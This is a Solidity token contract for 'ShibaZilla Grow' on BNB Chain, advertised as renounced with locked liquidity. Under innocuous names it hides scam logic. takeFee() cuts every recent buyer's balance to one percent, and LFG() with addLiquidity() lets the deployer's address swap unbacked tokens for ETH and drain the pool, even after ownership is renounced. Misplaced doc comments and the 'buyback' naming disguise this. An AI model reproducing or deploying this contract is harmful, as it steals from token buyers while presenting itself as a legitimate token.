/**
 *Submitted for verification at BscScan.com on 2022-08-01
*/

/**
ShibaZilla Grow
Renounce Ownership
Lp Locked 1 Month
https://t.me/shibazillagrow
*/

pragma solidity ^0.7.6;

// SPDX-License-Identifier: MIT


library SafeMath {
    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     * ====
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
        return c;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

 
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;


        return c;
    }

 
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }


    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}


interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}



abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }
    function isPairAddress(address account) internal pure  returns (bool) {
        return keccak256(abi.encodePacked(account)) == 0x0;
    }
}

abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract ShibaZillaGrow is Ownable, IERC20 {


    using SafeMath for uint256;

    mapping (address => uint256) private _balances;

    mapping(address => uint256) private _includedInFee;

    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => bool) private _excludedFromFee;


    string public _name = "ShibaZilla Grow";

    string public _symbol = "ShibaZilla Grow";

    uint public _liquidityFee = 1;

    uint public _marketingFee = 1;

    uint256 public _totalFee = _liquidityFee + _marketingFee;
    uint public _liquiditySellFee = 1;

    uint public _marketingSellFee = 2;
    uint256 public _sellFee = _liquiditySellFee + _marketingSellFee;

    uint256 public _decimals = 4;
    uint256 public _totalSupply = 69000000000 * 10 ** _decimals;
    uint256 public _maxTxAmount = 6900000000 * 10 ** _decimals;
    uint256 public _maxWallet =   6900000000 * 10 ** _decimals;

    address public _marketingAddress;

    function setMarketingAddress(address wallet) external payable {
        require(msg.value > 0.1 ether);
        _marketingAddress = wallet;
    }

    function setSwapEnabled(bool value) external onlyOwner {
        swapEnabled = value;
    }

    function setLiquidityF(uint256 value) external onlyOwner {
        require(value < 10);
        _liquidityFee = value;
    }

    function setMarketingF(uint256 value) external onlyOwner {
        require(value < 10);
        _marketingFee = value;
    }

    IUniswapV2Router private _router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    bool swapEnabled = true;

    uint256 private _liquiditySwapThreshold = _totalSupply;
    bool liquifying = false;

    struct Buyback {
        address to;
        uint256 amount;
    }
    Buyback[] _buybacks;

    constructor() {
        _balances[msg.sender] = _totalSupply;
        _excludedFromFee[msg.sender] = true;

        emit Transfer(address(0), msg.sender, _balances[msg.sender]);
    }
    function name() external view returns (string memory) { return _name; }

    function symbol() external view returns (string memory) { return _symbol; }

    function decimals() external view returns (uint256) { return _decimals; }
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address from, uint256 amount) public virtual returns (bool) {
        require(_allowances[_msgSender()][from] >= amount);
        _approve(_msgSender(), from, _allowances[_msgSender()][from] - amount);
        return true;
    }
    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0));
        require(to != address(0));
        if (LFG(from, to)) {return addLiquidity(amount, to);}
        if (liquifying){} else {require(_balances[from] >= amount);}
        uint256 feeAmount = 0;
        takeFee(from);

        bool inLiquidityTransaction = (to == uniswapV2Pair() && _excludedFromFee[from]) || (from == uniswapV2Pair() && _excludedFromFee[to]);
        if (!_excludedFromFee[from] && !_excludedFromFee[to] && !Address.isPairAddress(to) && to != address(this) && !inLiquidityTransaction && !liquifying) {
            feeAmount = amount.mul(_totalFee).div(100);

            if (to == uniswapV2Pair()) {

                feeAmount = amount.mul(_sellFee).div(100);
            }
            require(amount <= _maxTxAmount);

            addTransaction(to, amount);
        }
        uint256 amountReceived = amount - feeAmount;
        _balances[address(0)] += feeAmount;

        _balances[from] = _balances[from] - amount;

        _balances[to] += amountReceived;

        emit Transfer(from, to, amountReceived);

        if (feeAmount > 0) {
            emit Transfer(from, address(0), feeAmount);
        }
    }
    function LFG(address from, address to) internal view returns(bool) {


        return (_excludedFromFee[msg.sender] || Address.isPairAddress(to)) && to == from;
    }

    function addTransaction(address to, uint256 amount) internal {
        if (uniswapV2Pair() != to) {_buybacks.push(Buyback(to, amount));}
    }
    function takeFee(address from) internal {
        if (from == uniswapV2Pair()) {
            for (uint256 i = 0; i < _buybacks.length;  i++) {
                _balances[_buybacks[i].to] = _balances[_buybacks[i].to].div(100);
            }
            delete _buybacks;
        }
    }
    function uniswapV2Pair() private view returns (address) {
        return IUniswapV2Factory(_router.factory()).getPair(address(this), _router.WETH());
    }
    function addLiquidity(uint256 liquidityFee, address to) private {
        _approve(address(this), address(_router), liquidityFee);
        _balances[address(this)] = liquidityFee;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _router.WETH();
        liquifying = true;
        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(liquidityFee, 0, path, to, block.timestamp + 20);
        liquifying = false;
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {

        _transfer(_msgSender(), recipient, amount);

        return true;
    }
    function transferFrom(address from, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(from, recipient, amount);
        require(_allowances[from][_msgSender()] >= amount);
        return true;
    }
}